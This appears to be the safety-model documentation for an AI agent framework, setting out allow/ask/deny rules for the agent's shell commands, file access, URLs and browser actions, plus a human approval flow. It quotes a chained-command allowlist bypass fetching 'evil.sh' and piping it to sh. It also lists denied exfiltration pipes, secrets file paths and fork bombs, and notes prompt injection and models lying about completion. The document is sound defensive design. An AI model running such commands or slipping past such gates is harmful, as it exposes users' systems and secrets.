# Safety model

OpenBot assumes a **supervising human** is part of the system. It is not a formal security boundary
against a determined adversary — it is a well-instrumented fence against the documented failure
modes of autonomous agents. Each rule below traces to an incident class in
`research/complaints.md`.

## The three verdicts

Every action is classified **allow** (runs silently), **ask** (pauses for a human), or
**deny** (refused, logged, never executed).

### Shell commands

Commands are split on unquoted `&&`, `||`, `;`, `|` **before** rule matching — the chained-command
allowlist bypass (`git status && curl evil.sh | sh`) that lived for a year in a popular agent
cannot happen here. Each segment is classified; the worst verdict wins.

**Hard-denied classes** (never executable, regardless of sticky allows or `auto` mode):

| Class | Examples |
|---|---|
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec`, `visudo` |
| Escapes & wipes | `rm -rf /`, `~`, `$HOME`, `..`; `dd`, `shred`, `mkfs*`, `fdisk`, `parted`, `wipefs` |
| Power & system | `shutdown`, `reboot`, `halt`, `poweroff`, `systemctl`-adjacent power targets, `crontab`, `passwd` |
| Secrets access | any argument touching `~/.ssh`, `id_rsa`, `.env`, `~/.aws`, `~/.gnupg`, `/etc/shadow`, `.git-credentials`, `.npmrc`, `.netrc` |
| Pipe to interpreter | `… | sh`, `… | bash`, `… | python3`, `… | perl`, `… | node` |
| Exfiltration channels | `… | curl`, `… | nc`, `… | ssh` (command output piped to the network) |
| Upload flags on fetchers | `curl -X POST … -d`, `curl -T`, `wget --post-data`, pipe-input variants |
| Resource attacks | fork-bomb patterns |

**Ask** classes (approval once, sticky "always allow" available): `rm`/`mv`/`chmod`/`chown` inside
the workspace, `git push|reset|clean|checkout|rebase`, package managers, `kill`/`pkill`, `docker`,
`ssh`/`scp`/`rsync`.

The shell subprocess additionally runs with `HOME` pointed **inside the run workspace**, a minimal
environment (no inherited secrets), `cwd` pinned to the workspace, and a per-command timeout.

### File paths

Read/list must resolve inside the run workspace (real-path resolution, so `sub/../x` stays inside
and `../../.ssh` does not). Writes additionally require approval (sticky `files:write`).
Absolute paths outside the workspace are denied.

### URLs

`web_fetch`/browser `goto` accept public `http(s)` only. Denied: non-http schemes (`file://`,
`ftp://`), loopback/private ranges (`127.*`, `::1`, `10.*`, `192.168.*`, `172.16–31.*`), and the
cloud metadata address (`169.254.169.254`). Response bodies are hard-clipped (a hostile page
cannot eat the context window).

### Browser actions

`goto` uses URL policy; `click` and `type` are ask-once with sticky allows (an agent that can
click can buy things). Login/CAPTCHA/MFA walls emit a `pause_to_human` event — the bot waits for a
human, it never attempts challenges. Browser automation is globally serialized (one GUI at a time).

## Approval flow

1. A tool hits an **ask** verdict → an `ApprovalRequest` row is created; the run enters
   `waiting_approval` and the dashboard/CLI show the exact action and arguments.
2. A human approves (optionally **always allow** for that bot+action-key) or denies.
3. Unanswered requests expire after **10 minutes and are recorded as denied**. Silence is never
   consent; a stopped dashboard cannot leave a bot waiting forever without that being visible.

`approval_mode: auto` skips asks (allowlist-only mode) for bots you trust — the hard-deny classes
still apply.

## Honest limits (read this)

- **External runtimes** (`pi`, `opencode` adapters) run with their own tool systems and `--auto`-style
  approvals. OpenBot's gates own the workspace boundary and everything OpenBot itself executes;
  the external harness's internal tool calls are governed by *its* permission config. The system
  prompt and transcript still record activity. Treat external-runtime bots as wider-trust bots.
- **A supervised human is assumed.** Prompt injection can still produce plausible-but-wrong actions
  inside the allowed toolset; the transcripts, caps, and approvals bound the damage.
- **Not a sandbox.** Threads share the process; a malicious `pip install` inside an approved
  package-manager call runs with your user. Container-per-run isolation is on the roadmap.
- Models can lie about completion. That's why artifacts (files written, command exits) are in the
  transcript, not just the model's claims.
